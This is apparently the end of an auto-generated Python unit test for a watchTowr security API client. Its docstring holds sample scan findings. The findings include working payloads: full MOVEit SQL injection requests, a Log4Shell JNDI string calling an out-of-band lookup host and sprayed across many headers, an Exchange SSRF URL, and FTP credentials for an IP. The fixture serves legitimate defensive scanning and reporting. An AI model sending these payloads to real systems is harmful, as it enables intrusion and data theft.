Manipulate the affected host, and data held within.\n* Gain access to the internal network\n* Reading or modifying critical application data\n* Escalating privileges within the database and taking control of the database server\n","finding_impact":"Prioritised Findings","tags":[{"id":2,"name":"Defacement"}],"evidence":"An impact-less SQL injection payload was sent to the host which would result in a delay of 10 seconds in the processing of the SQL statement. The statement provided was: \nWAITFOR DELAY '00:00:10\n\nThe following request was sent to the host, resulting in the SQL statement being stored, but not processed:\n\nPOST /moveitisapi/moveitisapi.dll?action=m2 HTTP/1.1\nxx-silock-transaction: folder_add_by_path\nX-siLock-Transaction: session_setvars\nX-siLock-SessVar0: MyPkgID: 0\nX-siLock-SessVar1: MyPkgSelfProvisionedRecips: SQL Injection'); WAITFOR DELAY '00:00:10' -- asdf\nCookie: ASP.NET_SessionId=kdqs2mdjvrd5kpkfn540kojm; DMZCookieTest=ifyoucanreadthisyourbrowsersupportscookies; siLockLongTermInstID=1958; MIDMZLang=en; JavascriptTest=0; DesignModeTest=0; NoWiz=0; WizardVersions=3.1.5.0^3.1.5.0#4BD31B20-D5CB-45c6-94B5-EA50678F0A48#3.1.5|3.1.7.0#BAACAF97-A065-46f0-BB6F-C8EDD4C00761#3.1.7|3.2.0.0#CF71EA6C-6ABF-4bb7-B140-BBB26F9BD65D#3.2.0|3.3.0.0#CD72F011-CDD1-4c44-86D4-37E97CCED9BC#3.3.0|3.3.1.0#FB5FF2C3-B7EB-4394-804A-F5820554B59A#3.3.1|3.4.0.0#A81DF11E-14EB-48f6-B7CF-8D06AB608DE3#3.4.0|3.4.2.0#C5C02C87-534E-4bcd-A007-54975CF8BBAF#3.4.2|4.0.0.0#9D27C3FA-6662-4d29-99FB-A58A405FD584#4.0.0|4.5.0.0#03DED275-9DA6-450e-8A34-26684B2DDC78#4.5.0|5.0.0.0#02E58850-DBD8-40d9-8897-1F9F9471023C#5.0.0|5.1.0.0#DC811A54-8FE7-4653-9DB6-49CEABCE705A#5.1.0|5.5.0.0#0E409091-0585-415e-88B9-820BDC57094C#5.5.0|6.0.0.0#9C5FFF8F-0FE6-47ac-A0E6-85EF424F9D32#6.0.0|6.5.0.0#F589CCFE-5DCE-4009-844F-61433375F69B#6.5.0|7.0.0.0#B25AB9F1-B8A2-4072-8964-00C7EDF99750#7.0.0|7.1.0.0#CE335477-C2B3-4b59-8305-5D9A77D1F133#7.1.0|7.1.1.0#F88513AE-2CEB-4f9a-A863-CDC9913E3308#7.1.1|7.5.0.0#B2BF7972-1410-4501-8D5E-E42445D6D6E5#7.5.0|7.5.1.0#AFD262A2-9495-44de-B08A-D721B0D0D767#7.5.1|8.0.0.0#53A13770-347C-46e5-8C8E-54F514346BED#8.0.0|8.1.0.0#32E1ADD2-BE60-450e-9DF3-7CAAD1291A26#8.1.0|8.2.0.0#D5E8967C-C451-406e-AA2F-62DB81D47CF9#8.2.0|8.3.0.0#49B0CB30-31EB-4907-8312-4EA4B02DB4E1#8.3.0|9.0.0.0#72DBA6B5-BDCD-4622-959B-9C9BD959C764#9.0.0|9.5.0.0#58804433-7A99-4f6c-A95A-38D721B7E57D#9.5.0|9.6.0.0#5C6BA75D-7888-4F07-BAB1-080C59F88D11#9.6.0; LongTermCookieExpireDate=June 15 2025 04:54:33; visid_incap_2094604=YBTCYvZBSeevg/faM8K2pAgpimQAAAAAQUIPAAAAAADw/SibzJoQRPWarB3iKXAc; incap_ses_1557_2094604=HbzAS4hxOQccqnmmn5ObFQgpimQAAAAAAbhi+AutUsuttjtDULDSpQ==\nContent-Length: 0\n\n\n\nThereafter, a separate request was sent to the host to trigger the stored SQL statement. The server took more than 10 seconds to respond, indicating that the stored SQL statement was processed:\n\nPOST /guestaccess.aspx HTTP/1.1\nxx-silock-transaction: folder_add_by_path\nX-siLock-Transaction: session_setvars\nX-siLock-SessVar0: MyPkgID: 0\nX-siLock-SessVar1: MyPkgSelfProvisionedRecips: SQL Injection'); WAITFOR DELAY '00:00:10' -- asdf\nCookie: ASP.NET_SessionId=kdqs2mdjvrd5kpkfn540kojm; DMZCookieTest=ifyoucanreadthisyourbrowsersupportscookies; siLockLongTermInstID=1958; MIDMZLang=en; JavascriptTest=0; DesignModeTest=0; NoWiz=0; WizardVersions=3.1.5.0^3.1.5.0#4BD31B20-D5CB-45c6-94B5-EA50678F0A48#3.1.5|3.1.7.0#BAACAF97-A065-46f0-BB6F-C8EDD4C00761#3.1.7|3.2.0.0#CF71EA6C-6ABF-4bb7-B140-BBB26F9BD65D#3.2.0|3.3.0.0#CD72F011-CDD1-4c44-86D4-37E97CCED9BC#3.3.0|3.3.1.0#FB5FF2C3-B7EB-4394-804A-F5820554B59A#3.3.1|3.4.0.0#A81DF11E-14EB-48f6-B7CF-8D06AB608DE3#3.4.0|3.4.2.0#C5C02C87-534E-4bcd-A007-54975CF8BBAF#3.4.2|4.0.0.0#9D27C3FA-6662-4d29-99FB-A58A405FD584#4.0.0|4.5.0.0#03DED275-9DA6-450e-8A34-26684B2DDC78#4.5.0|5.0.0.0#02E58850-DBD8-40d9-8897-1F9F9471023C#5.0.0|5.1.0.0#DC811A54-8FE7-4653-9DB6-49CEABCE705A#5.1.0|5.5.0.0#0E409091-0585-415e-88B9-820BDC57094C#5.5.0|6.0.0.0#9C5FFF8F-0FE6-47ac-A0E6-85EF424F9D32#6.0.0|6.5.0.0#F589CCFE-5DCE-4009-844F-61433375F69B#6.5.0|7.0.0.0#B25AB9F1-B8A2-4072-8964-00C7EDF99750#7.0.0|7.1.0.0#CE335477-C2B3-4b59-8305-5D9A77D1F133#7.1.0|7.1.1.0#F88513AE-2CEB-4f9a-A863-CDC9913E3308#7.1.1|7.5.0.0#B2BF7972-1410-4501-8D5E-E42445D6D6E5#7.5.0|7.5.1.0#AFD262A2-9495-44de-B08A-D721B0D0D767#7.5.1|8.0.0.0#53A13770-347C-46e5-8C8E-54F514346BED#8.0.0|8.1.0.0#32E1ADD2-BE60-450e-9DF3-7CAAD1291A26#8.1.0|8.2.0.0#D5E8967C-C451-406e-AA2F-62DB81D47CF9#8.2.0|8.3.0.0#49B0CB30-31EB-4907-8312-4EA4B02DB4E1#8.3.0|9.0.0.0#72DBA6B5-BDCD-4622-959B-9C9BD959C764#9.0.0|9.5.0.0#58804433-7A99-4f6c-A95A-38D721B7E57D#9.5.0|9.6.0.0#5C6BA75D-7888-4F07-BAB1-080C59F88D11#9.6.0; LongTermCookieExpireDate=June 15 2025 04:54:33; visid_incap_2094604=YBTCYvZBSeevg/faM8K2pAgpimQAAAAAQUIPAAAAAADw/SibzJoQRPWarB3iKXAc; incap_ses_1557_2094604=HbzAS4hxOQccqnmmn5ObFQgpimQAAAAAAbhi+AutUsuttjtDULDSpQ==\nContent-Length: 0\n","recommendation":"The following versions are affected by the vulnerability CVE-2023-34362:\n\nMOVEit Transfer 2023.0.0 (15.0) and earlier\nMOVEit Transfer 2022.1.5 (14.1) and earlier\nMOVEit Transfer 2022.0.4 (14.0) and earlier\nMOVEit Transfer 2021.0.6 (13.0) and earlier\nMOVEit Transfer 2020.1.0 (12.1) and earlier\nMOVEit Transfer 2020.0.x(12.0) and earlier – no patch is available for this version\n\nAny other earlier version of MOVEit Transfer should also be considered to be vulnerable.\n\nIt is recommended that the host be upgraded to a patched version of MOVEit Transfer. As there are known active exploitation of the vulnerability, it is recommended that the host be reviewed internally if the hosts have been previously compromised by attackers through the Indicator of Compromised (IOC) provided by the advisory.","references":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:W/RC:C","severity":"critical","status":"confirmed","affected":{"data":{"type":"subdomain","source":"module-demo-data","status":"verified","created_at":"2023-06-09T09:35:54.000Z","updated_at":"2023-12-28T20:03:09.000Z","deleted_at":null,"id":"552","name":"moveit-demo.watchtowr.com","businessUnits":[],"live":false}},"cve_id":"CVE-2023-34362","epss_score":"0.899420000","retest_history":[],"assigned_user":null},{"id":2716,"title":"Email DNS Records Vulnerable To Takeover","created_at":"2023-02-07T02:52:33.000Z","cvssv3_score":8.7,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C","description":"The affected hostname was identified to specify MX records (email server DNS records) where the specified priority mail server top-level domain name had expired and was available for registration.\n\nIf the unregistered domain name was identified by an attacker, an attacker would be able to register this domain name for minimal expense and deploy infrastructure to receive email on behalf of the affected hostname.\n\n","impact":"If discovered and exploited by an attacker, it would be possible to;\n\n* Receive password reset emails\n* Intercept confidential information\n* Perform phishing attacks with the affected hostname\n\nand many other attacks - limited only by their creativity.","finding_impact":"Prioritised Findings","tags":[{"id":3,"name":"Sensitive Data"}],"evidence":"A hostname belonging to an unregistered domain is specified as a mail server for the affected host (test.com).\n\nThe following domain is found to be unregistered:\nDomain: doesnotexist.cz\n\nThis unregistered domain is specified within the configured MX records for test.com - which could be abused by an attacker to receive email intended for the affected host, if registered.\n\nRaw 'dig' output indicating the MX records that currently exist for this domain can be found below:\n\n\n; <<>> DiG 9.16.33-Debian <<>> MX test.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 58866\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 65494\n;; QUESTION SECTION:\n;test.com.\t\tIN\tMX\n\n;; ANSWER SECTION:\ntest.com.\t1798\tIN\tMX\t10 mail.doesnotexist.cz.\ntest.com.\t1798\tIN\tMX\t20 dm2.doesnotexist.cz.\n\n;; Query time: 0 msec\n;; SERVER: 127.0.0.53#53(127.0.0.53)\n;; WHEN: Thu Feb 02 08:05:34 UTC 2023\n;; MSG SIZE  rcvd: 107\n","recommendation":"It is recommended that the affected MX records, pointing to the unregistered domain name, be removed to ensure that email is only handled by intended authorised mail servers.","references":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C","severity":"high","status":"confirmed","affected":{"data":{"type":"domain","source":"module-adversarysight-azure-get-federation-information\t","status":"verified","created_at":"2022-09-23T09:55:43.000Z","updated_at":"2023-12-29T12:20:55.000Z","deleted_at":null,"id":"1","name":"watchtowr.com","businessUnits":[],"live":false}},"cve_id":null,"epss_score":null,"retest_history":[],"assigned_user":null},{"id":2648,"title":"Weak Credentials In Use (FTP)","created_at":"2023-02-01T21:33:15.000Z","cvssv3_score":6.2,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:H/RL:O/RC:C","description":"The affected host was identified to exposed an FTP server utilising weak credentials.","impact":"If discovered and exploited by an attacker, it may be possible to;\n\n* Access sensitive data stored on the host\n* Upload data to the affected host\n* Modify data stored on the affected host","finding_impact":"Prioritised Findings","tags":[],"evidence":"The following credentials were discovered to be valid for the FTP service listening on 18.143.202.5:21\n\nUsername: root\nPassword: http\n","recommendation":"It is recommended that access to the FTP server from the Internet be restricted if there is no strict requirement for this service to be exposed, and that the weak credentials identified be rotated and reset to strong credentials.\n\nFurthermore, it is recommended that actions are taken to ensure that the discovered weak credentials have not already been utilised by an attacker.","references":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:H/RL:O/RC:C","severity":"medium","status":"confirmed","affected":{"data":{"type":"TCP","status":"verified","created_at":"2022-12-15T10:21:55.000Z","updated_at":"2023-01-26T04:08:15.000Z","id":"167","ip":"18.143.202.5","ip_id":140,"port":21,"banner":"220 Welcome to the Go FTP Server\r\n","service":"ftp","businessUnits":[]}},"cve_id":null,"epss_score":null,"retest_history":[{"requested_by":"User Name","requested_at":"2024-01-29T06:36:52.000Z","retest_status":"in-progress","completed_at":null,"evidence":"No evidences"},{"requested_by":"User Name","requested_at":"2024-01-23T03:34:53.000Z","retest_status":"success","completed_at":"2024-01-23T03:37:41.000Z","evidence":"Some evidence"}],"assigned_user":null},{"id":2586,"title":"Log4Shell Remote Code Execution (CVE-2021-44228)","created_at":"2023-01-31T11:43:35.000Z","cvssv3_score":9.4,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C","description":"The affected host was identified to be vulnerable to Log4Shell, tracked as CVE-2021-44228.\n\nLog4Shell takes advantage of vulnerable version of Log4J allowing requests to arbitrary LDAP and JNDI servers, allowing attackers to execute arbitrary Java code on a server or other computer, or leak sensitive information.\n\nLog4J is a popular logging framework for Java-based applications, with certain versions vulnerable to Remote Code Execution when Log4J logs user-controlled input, with a specially crafted payload.\n\nFor the purposes of identification of this weakness, watchTowr leverages an impact-less payload that, within vulnerable Log4J deployments, triggers a DNS request containing the hostname of the affected machine to watchTowr-controlled infrastructure to confirm with high-fidelity that this host is vulnerable. Given the deep processing of data by Log4J, it is important to note that the target system (that the payload was initially sent to, and indicated within the request) may not be the vulnerable system.","impact":"If leveraged, this vulnerability could allow an attacker to;\n\n* Execute arbitrary code on the affected host\n* Gain access to the underlying host and affected data\n* Tunnel access to internal systems","finding_impact":"Prioritised Findings","tags":[],"evidence":"https://watchtowr.com:443\n\nThe request sends a Log4J payload with a JNDI expression of ${hostName} to extract the host's hostname environment variable using the raw payload of \"${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\".\n\nThe vulnerable service evaluated the JNDI payload, and created a pingback to watchTowr-owned infrastructure, 22a42245-58a5-4640-9e84-b7925bf23b22.WATCHTOWR-HOSTNAME.oob.dns.outbound.watchtowr.com. This allows us to attribute the vulnerable machine's hostname as \"WATCHTOWR-HOSTNAME\".\n\nSubsequent to this DNS lookup, an LDAP connection was observed from the affected host attempting to connect to watchTowr infrastructure.\n\nAffected parameters:\nGet Parameter\n\nRaw Payload: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nResponse:\n[22a42245-58a5-4640-9e84-b7925bf23b22.WATCHTOWR-HOSTNAME.oob.dns.outbound.watchtowr.com] Received DNS interaction\nExtracted internal hostname: WATCHTOWR-HOSTNAME\n\nSample Request:\nGET /?watchtowr=${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}&watchtowr=${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nHost: watchtowr.com\nX-Api-Version: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nReferer: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nUser-Agent: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nX-Druid-Comment: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nOrigin: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nLocation: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nX-Forwarded-For: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nX-Forwarded-Host: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAccept: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nCookie: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}=${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAccept-Encoding: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAccept-Language: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAccess-Control-Request-Headers: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAccess-Control-Request-Method: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nAuthentication: Bearer ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nX-CSRF-Token: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nX-Origin: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}\nUpgrade-Insecure-Requests: ${jndi:ldap://22a42245-58a5-4640-9e84-b7925bf23b22.${hostName}.oob.dns.outbound.watchtowr.com/watchtowr.class}","recommendation":"We recommend that a review is done to identify and determine which vulnerable system may be processing JNDI payloads within a vulnerable instance of Log4J.\n\nIt is important to note that given the typical usage of Log4J, the target system (that the payload was initially sent to) may not be the vulnerable system and thus we recommend reviewing the extracted hostname within the evidence, and the parameter in which the confirmed payload was sent within, to allow for precise remediation.\n\nIf patching of the affected Log4J instance is not immediately possible, we recommend starting your server with log4j2.formatMsgNoLookups set to true.\n\nFurthermore, it is recommended that actions are taken to ensure that the vulnerability has not already been abused by an attacker.","references":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C","severity":"critical","status":"confirmed","affected":{"data":{"type":"domain","source":"module-adversarysight-azure-get-federation-information\t","status":"verified","created_at":"2022-09-23T09:55:43.000Z","updated_at":"2023-12-29T12:20:55.000Z","deleted_at":null,"id":"1","name":"watchtowr.com","businessUnits":[],"live":false}},"cve_id":"CVE-2021-44228","epss_score":"0.974540000","retest_history":[{"requested_by":"User Name","requested_at":"2024-01-29T06:36:52.000Z","retest_status":"in-progress","completed_at":null,"evidence":"No evidences"}],"assigned_user":null},{"id":2518,"title":"Management Interface Exposed (SSH)","created_at":"2023-01-18T00:27:36.000Z","cvssv3_score":3.5,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N/E:F/RL:W/RC:C","description":"An SSH management interface was found to be exposed to the internet on the affected host. Allowing management services to be accessible from untrusted networks increases the attack surface of a host, and related network.\n\nIf a weak password is in use or the credentials can be compromised (e.g. via a brute-force attack) an attacker could gain access to privileged functions.","impact":"An exposed management interface could enable external attackers to target sensitive functionality directly, leading to a compromise of the underlying host or data held within.\n\nAccess to a management interface can be achieved in many ways once identified, including password bruteforce, credential reuse and spraying, or a vulnerability in the management interface itself.","finding_impact":"Prioritised Findings","tags":[],"evidence":"An SSH administrative interface was found to be exposed on the following IP & port:\nIP Address: 1.1.1.1\nPort: 22\nBanner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13","recommendation":"Direct remote access to management interfaces should strictly be disabled by default. It is strongly recommended that access to the management service be restricted to the organisation's internal network.\n\nIf external remote access is required, whitelist network-level access controls should be implemented to ensure that only authorised IP Addresses are allowed to access the environment or a connection via a secured VPN facility with authentication credentials.\n\nAdditional strengthening of the security posture of the interface by implementing multi-factor authentication (e.g. hardware one-time tokens, SMS or software tokens) should also be considered.","references":"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N/E:F/RL:W/RC:C","severity":"low","status":"confirmed","affected":{"data":{"type":"domain","source":"module-adversarysight-azure-get-federation-information\t","status":"verified","created_at":"2022-09-23T09:55:43.000Z","updated_at":"2023-12-29T12:20:55.000Z","deleted_at":null,"id":"1","name":"watchtowr.com","businessUnits":[],"live":false}},"cve_id":null,"epss_score":null,"retest_history":[{"requested_by":"User Name","requested_at":"2024-01-29T06:36:52.000Z","retest_status":"in-progress","completed_at":null,"evidence":"No evidences"}],"assigned_user":null},{"id":649,"title":"Potential Exposure to Microsoft Exchange 0-Day Vulnerability","created_at":"2022-10-15T11:05:00.000Z","cvssv3_score":7.1,"cvssv3_metrics":"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:R","description":"The affected host was identified to be utilising a version of Microsoft Exchange that is vulnerable to a post-authenticated Server-Side Request Forgery (SSRF) vulnerability, tracked as CVE-2022-41040. \n\nThis vulnerability is also commonly associated with the \"ProxyNotShell\" exploit, where the post-authenticated SSRF was abused as an initial stepping stone to an RCE exploit (tracked under CVE-2022-41082).\n\nSSRF vulnerabilities allow an attacker to induce or coerce server-side applications to issue a back-end lookup, and protocol-specific request (in this case, HTTP request) to an attacker-supplied location. The response from the back-end request is returned in the application's front-end response, allowing an attacker to browse internal and restricted systems.\n\nSpecific to this vulnerability, this SSRF would allow an attacker to access the PowerShell Remoting service typically available to an exchange server. This could then be abused by an attacker to perform object deserialization and conversion operations outlined in CVE-2022-41082, leading to remote code execution.","impact":"If discovered and exploited by an attacker, it may be possible to;\n\n* Abuse the SSRF vulnerability to invoke PowerShell Remoting, which may be further exploited to gain RCE on the vulnerable Exchange via object deserialization\n* Access other backend services available to the Exchange server","finding_impact":"Prioritised Findings","tags":[{"id":4,"name":"Credentials"}],"evidence":"Affected URL: http://autodiscover.watchtowr.com/autodiscover/autodiscover.json?@2GAQpUSRSmGb9sbrpz8K7OxI1iC.com/%50owershell?=&Email=autodiscover/autodiscover.json?@2GAQpUSRSmGb9sbrpz8K7OxI1iC.com\n\n","recommendation":"It is recommended that the affected instance of Microsoft Exchange be upgraded to a version that includes a patch for CVE-2022-41040.\n\nThe vulnerability has been addressed in the following Microsoft Updates:\n* Microsoft Exchange Server 2016 Cumulative Update 23\n* Microsoft Exchange Server 2019 Cumulative Update 12\n* Microsoft Exchange Server 2019 Cumulative Update 11\n* Microsoft Exchange Server 2016 Cumulative Update 22\n* Microsoft Exchange Server 2013 Cumulative Update 23","references":"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:R","severity":"high","status":"confirmed","affected":{"data":{"type":"subdomain","source":"module-adversarysight-subdomain-general-bruteforce-gobuster","status":"verified","created_at":"2022-09-24T21:05:46.000Z","updated_at":"2023-12-28T22:01:05.000Z","deleted_at":null,"id":"43","name":"autodiscover.watchtowr.com","businessUnits":[],"live":false}},"cve_id":"CVE-2022-41040","epss_score":"0.965310000","retest_history":[{"requested_by":"User Name","requested_at":"2024-01-29T06:36:52.000Z","retest_status":"in-progress","completed_at":null,"evidence":"No evidences"}],"assigned_user":null}],
                meta = watchtowr_api.models.meta.Meta(
                    pagination = {"total":20,"count":10,"per_page":10,"current_page":1,"total_pages":2,"links":{"previous":"url","next":"url"}}, ),
        )
        """

    def testPaginatedClientFindings(self):
        """Test PaginatedClientFindings"""
        # inst_req_only = self.make_instance(include_optional=False)
        # inst_req_and_optional = self.make_instance(include_optional=True)

if __name__ == '__main__':
    unittest.main()
